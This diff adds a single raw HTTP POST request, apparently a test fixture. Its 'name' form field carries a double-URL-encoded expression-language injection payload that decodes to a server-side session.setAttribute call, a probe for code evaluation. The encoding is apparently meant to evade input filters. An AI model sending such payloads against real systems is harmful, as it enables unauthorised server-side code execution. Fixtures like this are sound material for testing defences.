@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+Connection: close
+
+name=%2523%257Bsession.setAttribute%2528%2527a%2527%252C%2527b%2527%2529%257D
